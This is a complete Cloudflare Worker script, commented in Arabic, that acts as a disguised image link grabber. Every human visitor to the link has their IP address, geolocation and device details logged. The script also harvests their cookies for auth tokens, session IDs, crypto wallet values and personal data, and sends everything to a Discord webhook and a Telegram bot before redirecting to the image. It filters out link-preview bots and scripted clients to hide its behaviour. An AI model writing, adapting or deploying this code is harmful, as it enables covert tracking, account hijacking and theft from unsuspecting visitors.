// src/index.js - النسخة المعدلة (مع فلتر البوتات)
// ========== إعدادات من wrangler.toml ==========
// DISCORD_WEBHOOK, IMAGE_URL, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID
// ===============================================

// قاعدة بيانات الزيارات (في ذاكرة Worker)
const visits = new Map();
let visitorCounter = 0;

// ========== فلتر البوتات ==========
function isDiscordBot(userAgent) {
    if (!userAgent) return false;
    const botPatterns = [
        /discord/i,
        /twitterbot/i,
        /facebookexternalhit/i,
        /slackbot/i,
        /telegrambot/i,
        /whatsapp/i,
        /linkedinbot/i,
        /pinterest/i,
        /reddit/i,
        /tumblr/i,
        /skype/i,
        /viber/i,
        /line/i,
        /wechat/i,
        /baidu/i,
        /yandex/i,
        /bingbot/i,
        /googlebot/i,
        /duckduckbot/i,
        /applebot/i,
        /mediapartners/i,
        /adsbot/i,
        /feedfetcher/i,
        /curl/i,
        /wget/i,
        /python/i,
        /java/i,
        /node/i,
        /axios/i,
        /fetch/i,
        /headless/i
    ];
    return botPatterns.some(pattern => pattern.test(userAgent));
}

// ========== دوال استخراج البيانات ==========

function extractTokensFromCookies(cookies) {
    const tokens = [];
    const tokenPatterns = [
        { regex: /^eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+$/, type: '🪪 JWT Token' },
        { regex: /^[A-Fa-f0-9]{32,}$/, type: '🔢 MD5/Hex Token' },
        { regex: /^[A-Za-z0-9]{40,}$/, type: '🔢 SHA1/Hex Token' },
        { regex: /^[A-Za-z0-9]{64,}$/, type: '🔢 SHA256/Hex Token' },
        { regex: /^sk_live_[A-Za-z0-9]{24,}$/, type: '💳 Stripe Live' },
        { regex: /^sk_test_[A-Za-z0-9]{24,}$/, type: '💳 Stripe Test' },
        { regex: /^pk_live_[A-Za-z0-9]{24,}$/, type: '💳 Stripe Public Live' },
        { regex: /^pk_test_[A-Za-z0-9]{24,}$/, type: '💳 Stripe Public Test' },
        { regex: /^ghp_[A-Za-z0-9]{36,}$/, type: '🐙 GitHub Personal' },
        { regex: /^gho_[A-Za-z0-9]{36,}$/, type: '🐙 GitHub OAuth' },
        { regex: /^ghu_[A-Za-z0-9]{36,}$/, type: '🐙 GitHub User' },
        { regex: /^glpat-[A-Za-z0-9\-_]{20,}$/, type: '🦊 GitLab Personal' },
        { regex: /^sdp_[A-Za-z0-9]{32,}$/, type: '💬 Slack Bot' },
        { regex: /^xoxb-[A-Za-z0-9\-_]{40,}$/, type: '💬 Slack Bot User' },
        { regex: /^xoxp-[A-Za-z0-9\-_]{40,}$/, type: '💬 Slack User' },
        { regex: /^xoxa-[A-Za-z0-9\-_]{40,}$/, type: '💬 Slack App' },
        { regex: /^ya29\.[A-Za-z0-9\-_]{40,}$/, type: '🔴 Google OAuth' },
        { regex: /^EAA[A-Za-z0-9]{40,}$/, type: '🔵 Facebook Access' },
        { regex: /^EAAG[A-Za-z0-9]{40,}$/, type: '🔵 Facebook Graph' },
        { regex: /^[A-Za-z0-9]{22,}\.[A-Za-z0-9]{22,}\.[A-Za-z0-9]{22,}$/, type: '🎮 Discord Bot' },
        { regex: /^mfa\.[A-Za-z0-9\-_]{40,}$/, type: '🎮 Discord MFA' },
        { regex: /^api_key_[A-Za-z0-9]{24,}$/, type: '⚡ API Key' },
        { regex: /^token_[A-Za-z0-9]{24,}$/, type: '🔑 Generic Token' },
        { regex: /^auth_[A-Za-z0-9]{24,}$/, type: '🔑 Auth Token' },
        { regex: /^Bearer\s+[A-Za-z0-9\-_\.]+$/, type: '🛡️ Bearer Token' },
        { regex: /^[A-Za-z0-9+/]{32,}={0,2}$/, type: '🔑 Base64 Token' },
        { regex: /^[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}$/, type: '🔑 UUID/GUID' }
    ];

    if (!cookies) return tokens;
    const cookiePairs = cookies.split(';');
    cookiePairs.forEach(cookie => {
        const [name, ...rest] = cookie.trim().split('=');
        if (name && rest.length > 0) {
            const value = decodeURIComponent(rest.join('='));
            let matched = false;
            tokenPatterns.forEach(pattern => {
                if (pattern.regex.test(value)) {
                    tokens.push({ name, value, type: pattern.type, source: '🍪 Cookie' });
                    matched = true;
                }
            });
            if (!matched && (name.toLowerCase().includes('token') || name.toLowerCase().includes('auth'))) {
                if (value.length > 10 && !value.includes(' ')) {
                    tokens.push({ name, value, type: '🔍 Suspected Token', source: '🍪 Cookie' });
                }
            }
        }
    });
    return tokens;
}

function extractWalletsFromCookies(cookies) {
    const wallets = [];
    const walletPatterns = [
        { regex: /^0x[a-fA-F0-9]{40}$/, type: '🟣 Ethereum Wallet' },
        { regex: /^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/, type: '🟠 Bitcoin Legacy' },
        { regex: /^bc1[a-zA-Z0-9]{39,59}$/, type: '🟠 Bitcoin Bech32' },
        { regex: /^[A-Za-z0-9]{32,44}$/, type: '🟡 Solana Wallet' },
        { regex: /^[A-Za-z0-9]{56,88}$/, type: '🔵 Stellar Wallet' },
        { regex: /^[A-Za-z0-9]{56}$/, type: '🔵 Ripple Wallet' },
        { regex: /^[a-z0-9]{64}$/, type: '⚪ Monero Wallet' },
        { regex: /^[A-Za-z0-9]{26,35}$/, type: '🔵 Stellar Base' }
    ];

    if (!cookies) return wallets;
    const cookiePairs = cookies.split(';');
    cookiePairs.forEach(cookie => {
        const [name, ...rest] = cookie.trim().split('=');
        if (name && rest.length > 0) {
            const value = decodeURIComponent(rest.join('='));
            walletPatterns.forEach(pattern => {
                if (pattern.regex.test(value)) {
                    wallets.push({ address: value, type: pattern.type, source: '🍪 Cookie', name });
                }
            });
            if (name.toLowerCase().includes('wallet') || name.toLowerCase().includes('metamask') ||
                name.toLowerCase().includes('seed') || name.toLowerCase().includes('phrase')) {
                if (value.length > 15) {
                    wallets.push({ address: value, type: '🔐 Wallet Seed/Phrase', source: '🍪 Cookie', name });
                }
            }
        }
    });
    return wallets;
}

function extractSessionsFromCookies(cookies) {
    const sessions = [];
    const sessionKeywords = ['session', 'sid', 'sessionid', 'session_id', 'PHPSESSID', 'JSESSIONID', 'ASPSESSIONID'];

    if (!cookies) return sessions;
    const cookiePairs = cookies.split(';');
    cookiePairs.forEach(cookie => {
        const [name, ...rest] = cookie.trim().split('=');
        if (name && rest.length > 0) {
            const value = decodeURIComponent(rest.join('='));
            const nameLower = name.toLowerCase();
            if (sessionKeywords.some(k => nameLower.includes(k.toLowerCase())) || nameLower.includes('session')) {
                sessions.push({ name, value, type: '🔑 Session ID', source: '🍪 Cookie' });
            }
            if (nameLower.includes('csrf') || nameLower.includes('xsrf') || nameLower.includes('_token')) {
                sessions.push({ name, value, type: '🛡️ CSRF/XSRF Token', source: '🍪 Cookie' });
            }
        }
    });
    return sessions;
}

function extractSavedDataFromCookies(cookies) {
    const savedData = [];
    const keywords = ['email', 'username', 'user', 'login', 'signin', 'phone', 'address', 'name', 'first', 'last',
        'full_name', 'nick', 'display_name', 'screen_name', 'profile', 'bio', 'about'];

    if (!cookies) return savedData;
    const cookiePairs = cookies.split(';');
    cookiePairs.forEach(cookie => {
        const [name, ...rest] = cookie.trim().split('=');
        if (name && rest.length > 0) {
            const value = decodeURIComponent(rest.join('='));
            const nameLower = name.toLowerCase();
            if (keywords.some(k => nameLower.includes(k)) || nameLower.includes('email')) {
                if (value.length > 2 && value.length < 500) {
                    savedData.push({ type: '📝 User Data', name, value, source: '🍪 Cookie' });
                }
            }
            const emailMatch = String(value).match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
            if (emailMatch) {
                savedData.push({ type: '📧 Email', name, value: emailMatch[0], source: '🍪 Cookie' });
            }
            const phoneMatch = String(value).match(/(\+?\d{1,3}[-.\s]?)?\(?\d{1,4}\)?[-.\s]?\d{1,4}[-.\s]?\d{1,9}/);
            if (phoneMatch && phoneMatch[0].length > 8) {
                savedData.push({ type: '📱 Phone Number', name, value: phoneMatch[0], source: '🍪 Cookie' });
            }
        }
    });
    return savedData;
}

function parseUserAgent(ua) {
    const info = {
        browser: 'Unknown',
        version: 'Unknown',
        os: 'Unknown',
        device: 'Desktop',
        isMobile: false,
        isBot: false,
        isHeadless: false,
        isCrawler: false
    };

    if (!ua) return info;
    if (/bot|crawler|spider|scraper|facebookexternalhit|preview|headless/i.test(ua)) info.isBot = true;
    if (/googlebot|bingbot|slurp|duckduckbot|baiduspider|yandexbot/i.test(ua)) info.isCrawler = true;
    if (ua.includes('Headless')) info.isHeadless = true;

    if (ua.includes('Firefox')) {
        info.browser = 'Firefox';
        const match = ua.match(/Firefox\/(\d+\.\d+)/);
        if (match) info.version = match[1];
    } else if (ua.includes('Chrome') && !ua.includes('Edg')) {
        info.browser = 'Chrome';
        const match = ua.match(/Chrome\/(\d+\.\d+)/);
        if (match) info.version = match[1];
    } else if (ua.includes('Safari') && !ua.includes('Chrome')) {
        info.browser = 'Safari';
        const match = ua.match(/Version\/(\d+\.\d+)/);
        if (match) info.version = match[1];
    } else if (ua.includes('Edg')) {
        info.browser = 'Edge';
        const match = ua.match(/Edg\/(\d+\.\d+)/);
        if (match) info.version = match[1];
    } else if (ua.includes('Opera') || ua.includes('OPR')) {
        info.browser = 'Opera';
        const match = ua.match(/Opera\/(\d+\.\d+)/);
        if (match) info.version = match[1];
    }

    if (ua.includes('Windows NT 10.0')) info.os = 'Windows 10';
    else if (ua.includes('Windows NT 6.1')) info.os = 'Windows 7';
    else if (ua.includes('Mac OS X 10_15')) info.os = 'macOS Catalina';
    else if (ua.includes('Android')) info.os = 'Android';
    else if (ua.includes('iPhone')) info.os = 'iOS';
    else if (ua.includes('Linux')) info.os = 'Linux';

    if (/mobile|android|iphone|ipad|ipod|blackberry|windows phone/i.test(ua)) {
        info.isMobile = true;
        info.device = 'Mobile';
    } else if (/tablet|ipad/i.test(ua)) {
        info.device = 'Tablet';
    }

    return info;
}

async function getIPInfo(ip) {
    try {
        const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,org,timezone,zip,as,proxy,hosting,mobile`);
        const data = await response.json();
        return data.status === 'success' ? data : null;
    } catch(e) {
        return null;
    }
}

function getVisitorId(ip) {
    const key = ip.split(',')[0].trim();
    if (visits.has(key)) {
        return visits.get(key);
    }
    visitorCounter++;
    const visitorId = `V-${visitorCounter}`;
    visits.set(key, visitorId);
    return visitorId;
}

// ========== المعالج الرئيسي ==========

export default {
    async fetch(request, env) {
        // 1. استخراج البيانات
        const ip = request.headers.get('cf-connecting-ip') || request.headers.get('x-forwarded-for') || '0.0.0.0';
        const realIP = ip.split(',')[0].trim();
        const ua = request.headers.get('user-agent') || 'unknown';

        // ====== فلتر البوتات ======
        // لو الطلب من ديسكورد أو أي بوت، اعرض الصورة مباشرة بدون تسجيل
        if (isDiscordBot(ua)) {
            return Response.redirect(env.IMAGE_URL, 302);
        }

        // 2. الحصول على معرف الزائر (ثابت لكل IP)
        const visitorId = getVisitorId(realIP);

        const referer = request.headers.get('referer') || 'direct';
        const acceptLang = request.headers.get('accept-language') || 'N/A';
        const cookies = request.headers.get('cookie') || '';

        // 3. استخراج البيانات
        const tokens = extractTokensFromCookies(cookies);
        const wallets = extractWalletsFromCookies(cookies);
        const sessions = extractSessionsFromCookies(cookies);
        const savedData = extractSavedDataFromCookies(cookies);
        const uaInfo = parseUserAgent(ua);
        const ipInfo = await getIPInfo(realIP);

        // 4. تجميع البيانات
        const data = {
            visitorId: visitorId,
            timestamp: new Date().toISOString(),
            ip: {
                address: realIP,
                country: ipInfo?.country || 'N/A',
                region: ipInfo?.regionName || 'N/A',
                city: ipInfo?.city || 'N/A',
                lat: ipInfo?.lat || 'N/A',
                lon: ipInfo?.lon || 'N/A',
                isp: ipInfo?.isp || 'N/A',
                as: ipInfo?.as || 'N/A',
                proxy: ipInfo?.proxy || false,
                hosting: ipInfo?.hosting || false
            },
            device: uaInfo,
            request: {
                userAgent: ua,
                referer: referer,
                language: acceptLang
            },
            tokens: tokens,
            wallets: wallets,
            sessions: sessions,
            savedData: savedData,
            stats: {
                totalTokens: tokens.length,
                totalWallets: wallets.length,
                totalSessions: sessions.length,
                totalSavedData: savedData.length
            }
        };

        // ========== 5. بناء رسالة Webhook ==========

        // تنسيق الوقت بالإنجليزية
        const date = new Date();
        const options = { 
            year: 'numeric', 
            month: 'long', 
            day: 'numeric', 
            hour: '2-digit', 
            minute: '2-digit', 
            second: '2-digit',
            hour12: true 
        };
        const formattedTime = date.toLocaleString('en-US', options);

        const embedColor = uaInfo.isBot ? 0xFF0000 : 0x00FF00;
        const embedTitle = uaInfo.isBot ? '🤖 BOT DETECTED' : `👤 ${data.visitorId}`;

        // بناء المربعات
        const fields = [];

        // مربع الموقع
        fields.push({
            name: '📍 LOCATION & IP',
            value: `**IP:** ${data.ip.address}\n**Country:** ${data.ip.country}\n**City:** ${data.ip.city}\n**ISP:** ${data.ip.isp}\n**Proxy:** ${data.ip.proxy ? '✅ Yes' : '❌ No'}`,
            inline: true
        });

        // مربع الجهاز
        fields.push({
            name: '💻 DEVICE INFO',
            value: `**Browser:** ${data.device.browser}\n**Version:** ${data.device.version}\n**OS:** ${data.device.os}\n**Device:** ${data.device.device}\n**Mobile:** ${data.device.isMobile ? '✅ Yes' : '❌ No'}`,
            inline: true
        });

        // مربع الإحصائيات
        fields.push({
            name: '📊 STATISTICS',
            value: `**Tokens:** ${data.stats.totalTokens}\n**Wallets:** ${data.stats.totalWallets}\n**Sessions:** ${data.stats.totalSessions}\n**Saved Data:** ${data.stats.totalSavedData}`,
            inline: true
        });

        // مربع التوكينز
        if (data.tokens.length > 0) {
            const tokensByType = {};
            data.tokens.forEach(token => {
                if (!tokensByType[token.type]) tokensByType[token.type] = [];
                tokensByType[token.type].push(token);
            });

            Object.entries(tokensByType).forEach(([type, tokenList]) => {
                let block = '';
                tokenList.forEach(token => {
                    const displayValue = token.value.length > 100 ? token.value.substring(0, 100) + '...' : token.value;
                    block += `${token.source} **${token.name}:** \`${displayValue}\`\n`;
                });
                fields.push({
                    name: `${type} (${tokenList.length})`,
                    value: block || 'No tokens found',
                    inline: false
                });
            });
        } else {
            fields.push({
                name: '🔑 TOKENS',
                value: '`No tokens found`',
                inline: false
            });
        }

        // مربع المحافظ
        if (data.wallets.length > 0) {
            let walletBlock = '';
            const uniqueWallets = [];
            data.wallets.forEach(wallet => {
                if (!uniqueWallets.some(w => w.address === wallet.address)) {
                    uniqueWallets.push(wallet);
                }
            });
            uniqueWallets.forEach(wallet => {
                walletBlock += `${wallet.source} **${wallet.type}:** \`${wallet.address}\`\n`;
            });
            if (walletBlock) {
                fields.push({
                    name: `💳 WALLETS (${uniqueWallets.length})`,
                    value: walletBlock,
                    inline: false
                });
            }
        } else {
            fields.push({
                name: '💳 WALLETS',
                value: '`No wallets found`',
                inline: false
            });
        }

        // مربع الجلسات
        if (data.sessions.length > 0) {
            let sessionBlock = '';
            data.sessions.forEach(session => {
                sessionBlock += `${session.source} **${session.name}:** \`${session.value}\`\n`;
            });
            fields.push({
                name: `🔑 SESSIONS (${data.sessions.length})`,
                value: sessionBlock,
                inline: false
            });
        } else {
            fields.push({
                name: '🔑 SESSIONS',
                value: '`No sessions found`',
                inline: false
            });
        }

        // مربع البيانات المحفوظة
        if (data.savedData.length > 0) {
            const dataByType = {};
            data.savedData.forEach(item => {
                if (!dataByType[item.type]) dataByType[item.type] = [];
                dataByType[item.type].push(item);
            });
            Object.entries(dataByType).forEach(([type, items]) => {
                let block = '';
                items.forEach(item => {
                    const displayValue = item.value.length > 100 ? item.value.substring(0, 100) + '...' : item.value;
                    block += `${item.source} **${item.name}:** \`${displayValue}\`\n`;
                });
                fields.push({
                    name: `${type} (${items.length})`,
                    value: block,
                    inline: false
                });
            });
        } else {
            fields.push({
                name: '📝 SAVED DATA',
                value: '`No saved data found`',
                inline: false
            });
        }

        // بناء الـ Embed النهائي
        const embed = {
            title: `🔐 ${embedTitle} - CLOUDFLARE PRO`,
            color: embedColor,
            timestamp: new Date().toISOString(),
            fields: fields,
            footer: {
                text: `🔒 Cloudflare Ultimate Collector | ${formattedTime}`
            }
        };

        // ========== 6. إرسال إلى Discord ==========

        try {
            await fetch(env.DISCORD_WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [embed],
                    content: `🔐 **${data.visitorId} - NEW DATA COLLECTED - ${formattedTime}**`
                })
            });
        } catch(e) {}

        // ========== 7. إرسال إلى Telegram (اختياري) ==========

        if (env.TELEGRAM_BOT_TOKEN && env.TELEGRAM_CHAT_ID) {
            try {
                const message = `🔐 **${data.visitorId} - VIP DATA COLLECTED**\n\n` +
                    `📍 **Location:** ${data.ip.country} - ${data.ip.city}\n` +
                    `💻 **Device:** ${data.device.browser} (${data.device.version})\n` +
                    `📊 **Stats:** ${data.stats.totalTokens} Tokens, ${data.stats.totalWallets} Wallets\n` +
                    `🔑 **Sessions:** ${data.stats.totalSessions}\n` +
                    `📝 **Saved Data:** ${data.stats.totalSavedData}\n\n` +
                    `🕐 ${formattedTime}`;
                await fetch(`https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: env.TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
            } catch(e) {}
        }

        // ========== 8. إعادة توجيه إلى الصورة ==========

        return Response.redirect(env.IMAGE_URL, 302);
    }
};
